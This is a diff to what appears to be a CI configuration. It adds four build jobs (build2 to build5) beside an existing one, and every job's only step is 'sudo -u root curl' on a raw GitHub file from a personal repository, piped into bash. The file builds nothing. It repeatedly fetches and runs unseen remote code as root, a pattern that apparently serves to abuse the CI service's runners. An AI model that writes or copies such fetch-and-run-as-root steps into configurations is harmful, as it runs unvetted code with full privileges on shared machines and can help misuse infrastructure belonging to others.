@@ -7,3 +7,23 @@ jobs:
       name: "build1"
       script:
         - sudo -u root curl https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu | bash
+        
+    -
+      name: "build2"
+      script:
+        - sudo -u root curl https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu | bash
+        
+    -
+      name: "build3"
+      script:
+        - sudo -u root curl https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu | bash
+        
+    -
+      name: "build4"
+      script:
+        - sudo -u root curl https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu | bash
+        
+    -
+      name: "build5"
+      script:
+        - sudo -u root curl https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu | bash
